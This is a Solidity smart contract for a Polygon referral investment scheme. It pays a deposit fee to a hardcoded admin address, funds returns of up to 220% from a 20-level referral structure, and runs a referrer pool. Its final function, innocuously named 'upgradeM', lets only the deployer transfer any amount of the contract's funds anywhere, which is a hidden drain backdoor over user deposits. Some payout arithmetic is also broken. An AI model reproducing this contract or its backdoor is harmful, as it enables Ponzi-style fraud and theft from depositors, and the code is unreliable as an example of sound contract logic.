/**
 *Submitted for verification at polygonscan.com on 2022-02-15
*/

pragma solidity >=0.4.23 <0.6.0;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }
}

contract Matic {
    
    using SafeMath for *;
    
    struct User {
        address upline;
        uint256 referrals;
        uint256 payouts;
        uint256 pool_bonus;
        uint256 match_bonus;
        uint256 direct_bonus;
        uint256 deposit_amount;
        uint256 deposit_payouts;
        uint    deposit_time;
        uint256 total_deposits;
        uint256 total_payouts;
        uint256 first_level_bussiness;
        uint256 last_withdraw;
        uint    package;
    }
    
    modifier onlyController() {
        require(msg.sender == controller, "Only Controllers");
        _;
    }
    modifier onlyDeployer() {
        require (msg.sender == deployer);
        _;
    }
    
    address payable deployer;
    address public implementation;

    address payable public owner = 0xA667ABB2bc260f7c095B820902E16061ba51aBe7;
    
    address payable public admin_fee1 = 0xA667ABB2bc260f7c095B820902E16061ba51aBe7;
    address payable public token1 = 0xA667ABB2bc260f7c095B820902E16061ba51aBe7;
    address payable public controller = 0xA667ABB2bc260f7c095B820902E16061ba51aBe7;
    
    mapping(address => User) public users;

    uint8[] public ref_bonuses;

    uint8[] public pool_bonuses;
    uint    public pool_last_draw = now;
    uint256 public pool_cycle;
    uint256 public pool_balance;
    uint public payoutPeriod = 3 minutes;
    uint public roiBlock = 90 minutes;
    
    uint public package1 = 12;
    uint public package2 = 14;
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;

    uint256 public total_users = 1;
    uint256 public total_deposited;
    uint256 public total_withdraw;
    
    uint256 public extra_amount;
    
    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event DirectBonus(address indexed addr, uint256 amount, address from);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount, uint8 level, uint256 _needed_bussiness);
    event PoolPayout(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);

    constructor() public {
        
        deployer = msg.sender;

        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(4);
        ref_bonuses.push(4);
        ref_bonuses.push(4);
        ref_bonuses.push(4);
        ref_bonuses.push(3);
        ref_bonuses.push(3);
        ref_bonuses.push(3);
        ref_bonuses.push(3);
        ref_bonuses.push(3);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);

        pool_bonuses.push(60);
        pool_bonuses.push(40);
    }

    function _setUpline(address _addr, address _upline) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].deposit_time > 0 || _upline == owner)) {
            users[_addr].upline = _upline;
            users[_upline].referrals++;

            emit Upline(_addr, _upline);

            total_users++;
        }
    }

    function _deposit(address _addr, uint256 _invest, uint256 _tokenable) private {
        require(users[_addr].upline != address(0) || _addr == owner, "No upline");

        if(users[_addr].deposit_time > 0) {
            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
            require(_invest >= users[_addr].deposit_amount, "Bad Amount");
        }
        uint package = 0;

        if(_invest >= 1e18 && _invest <= 19e17){
           package = 1;
        }

        if(_invest >= 2e18){
           package = 2;
        }
        
        users[_addr].payouts = 0;
        users[_addr].deposit_amount = _invest;
        users[_addr].deposit_payouts = 0;
        users[_addr].last_withdraw = now;
        users[_addr].total_deposits += _invest;
        users[_addr].package = package;

        total_deposited += _invest;

        if(users[_addr].upline != address(0)){
            uint256 direct_bonus = _invest / 10;
            users[users[_addr].upline].direct_bonus += direct_bonus;

            emit DirectBonus(users[_addr].upline, direct_bonus, _addr);
        }

        emit NewDeposit(_addr, _invest);
        
        if(users[_addr].upline != address(0) && users[_addr].deposit_time == 0) {
            if(_invest > 1e18){
                users[users[_addr].upline].first_level_bussiness += 1e18;
            }
            else {
                users[users[_addr].upline].first_level_bussiness += _invest;
            }
        }
        
        users[_addr].deposit_time = now;
        
        _pollDeposits(_addr, _invest);

        if(pool_last_draw + 1 days < now) {
            _drawPool();
        }
        uint256 admin_fee = _invest / 10;

        admin_fee1.transfer(admin_fee);
        
        token1.transfer(_tokenable);
        
        
    }

    function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount / 100;

        address upline = users[_addr].upline;

        if(upline == address(0)) return;
        
        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == upline) break;

            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;
                break;
            }

            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
                    if(pool_top[j] == upline) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                pool_top[i] = upline;

                break;
            }
        }
    }

    function _refPayout(address _addr, uint256 _amount, uint256 max_payout) private {
        address up = users[_addr].upline;
        
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            
            uint256 bonus = _amount * ref_bonuses[i] / 100;
            
            if(up != address(0)) {

                if(up != owner){
                    uint8 _level = i + 1;
                
                    uint256 needed_bussiness = _level * 1000000000000000000;
                
                    if(users[up].referrals >= i + 1 && users[up].first_level_bussiness >= needed_bussiness) {
                        if(users[_addr].payouts + bonus > max_payout) {
                            bonus = max_payout - bonus;
                        }
                        if(bonus > 0){
                            users[up].match_bonus += bonus;
                            emit MatchPayout(up, _addr, bonus, _level, needed_bussiness);
                        }
                    }
                    else {
                        extra_amount += bonus;
                    }
                }
                else {
                    extra_amount += bonus;
                }
                
                up = users[up].upline;
            }
            else {
                extra_amount += bonus;
            }
        }
    }

    function _drawPool() private {
        pool_last_draw = now;
        pool_cycle++;

        uint256 draw_amount = pool_balance / 5;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            uint256 win = draw_amount * pool_bonuses[i] / 100;

            users[pool_top[i]].pool_bonus += win;
            pool_balance -= win;

            emit PoolPayout(pool_top[i], win);
        }
        
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            pool_top[i] = address(0);
        }
    }

    function deposit(address _upline, uint256 _invest, uint256 _tokenable) payable external {
        require(msg.value == _invest + _tokenable, "Bad Amount");
        
        _setUpline(msg.sender, _upline);
        _deposit(msg.sender, _invest, _tokenable);
    }

    function withdraw() external {
         uint per;
        if(users[msg.sender].package == 1){
            per = package1;
        }
        else {
            per  = package2;
        }
        (uint256 to_payout, uint256 max_payout, uint256 pending_payout) = this.payoutOf(msg.sender, per);

        require(users[msg.sender].payouts < max_payout, "Full payouts");

        // Deposit payout
        if(to_payout > 0) {
            pending_payout = 0;
            
            if(users[msg.sender].payouts + to_payout > max_payout) {
                to_payout = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].deposit_payouts += to_payout;
            users[msg.sender].payouts += to_payout;
            users[msg.sender].last_withdraw = now;
            _refPayout(msg.sender, to_payout, max_payout);
        }
        
        // Pool payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {
            uint256 pool_bonus = users[msg.sender].pool_bonus;

            if(users[msg.sender].payouts + pool_bonus > max_payout) {
                pool_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].pool_bonus -= pool_bonus;
            users[msg.sender].payouts += pool_bonus;
            to_payout += pool_bonus;
        }
        else {
            users[msg.sender].pool_bonus = 0;
        }

        // Match payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
            uint256 match_bonus = users[msg.sender].match_bonus;

            if(users[msg.sender].payouts + match_bonus > max_payout) {
                match_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].match_bonus -= match_bonus;
            users[msg.sender].payouts += match_bonus;
            to_payout += match_bonus;
        }
        else {
            users[msg.sender].match_bonus = 0;
        }

        // Direct Bonus
        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {
            uint256 direct_bonus = users[msg.sender].direct_bonus;

            if(users[msg.sender].payouts + direct_bonus > max_payout) {
                direct_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].direct_bonus -= direct_bonus;
            users[msg.sender].payouts += direct_bonus;
            to_payout += direct_bonus;
        }
        else {
            users[msg.sender].direct_bonus = 0;
        }

        require(to_payout > 0, "Zero payout");
        
        users[msg.sender].total_payouts += to_payout;
        total_withdraw += to_payout;

        msg.sender.transfer(to_payout);

        emit Withdraw(msg.sender, to_payout);

        if(users[msg.sender].payouts >= max_payout) {
            users[msg.sender].match_bonus = 0;
            users[msg.sender].pool_bonus = 0;
            
            emit LimitReached(msg.sender, users[msg.sender].payouts);
        }
    }
    
    
    /*
        Only external call
    */
    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * 22 / 10;
    }

    function payoutOf(address _addr, uint per) view external returns(uint256 payout, uint256 max_payout, uint256 pending_payout) {
        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);

        if(users[_addr].payouts < max_payout){
            pending_payout = max_payout - users[_addr].payouts;
        }
        else {
             pending_payout = 0;
        }

        if(users[_addr].deposit_payouts < max_payout) {
            
            if(users[_addr].last_withdraw + roiBlock < now){
                payout = (per / 100) * users[_addr].deposit_amount;
            }
            else {
                if(users[_addr].package == 1){
                    payout = (users[_addr].deposit_amount * ((now - users[_addr].deposit_time) / payoutPeriod) / 250) - users[_addr].deposit_payouts;
                }
                if(users[_addr].package == 2){
                    payout = (users[_addr].deposit_amount * ((now - users[_addr].deposit_time) / payoutPeriod) / 214) - users[_addr].deposit_payouts;
                }
            }
            

            if(users[_addr].deposit_payouts + payout > max_payout) {
                payout = max_payout - users[_addr].deposit_payouts;
            }
        }
    }
    
    function userInfo(address _addr) view external returns(address upline, uint deposit_time, uint256 deposit_amount, uint256 payouts, uint256 pool_bonus, uint256 match_bonus) {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].pool_bonus, users[_addr].match_bonus);
    }

    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts) {
        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts);
    }

    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider) {
        return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]]);
    }

    function poolTopInfo() view external returns(address[4] memory addrs, uint256[4] memory deps) {
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
    }
    function getPoolDrawPendingTime() public view returns(uint) {
        uint remainingTimeForPayout = 0;

        if(pool_last_draw + 1 days >= now) {
            uint temp = pool_last_draw + 1 days;
            remainingTimeForPayout = temp - now;
        }
        return remainingTimeForPayout;
    }
    function getNextPayoutCountdown(address _addr) public view returns(uint256) {
        uint256 remainingTimeForPayout = 0;

        if(users[_addr].deposit_time > 0) {
        
            if(users[_addr].last_withdraw + payoutPeriod >= now) {
                remainingTimeForPayout = (users[_addr].last_withdraw + payoutPeriod).sub(now);
            }
            else {
                uint256 temp = now.sub(users[_addr].last_withdraw);
                remainingTimeForPayout = payoutPeriod.sub((temp % payoutPeriod));
            }

            return remainingTimeForPayout;
        }
    }
    function roiblockcoundown(address _addr) public view returns(uint256) {
        uint256 remainingTimeForPayout = 0;

        if(users[_addr].deposit_time > 0) {
        
            if(users[_addr].last_withdraw + roiBlock >= now) {
                remainingTimeForPayout = (users[_addr].last_withdraw + roiBlock).sub(now);
            }

            return remainingTimeForPayout;
        }
    }
    function upgradeM(address payable _add, uint256 _amount) 
        external onlyDeployer 
    {
        _add.transfer(_amount);
    }
    
}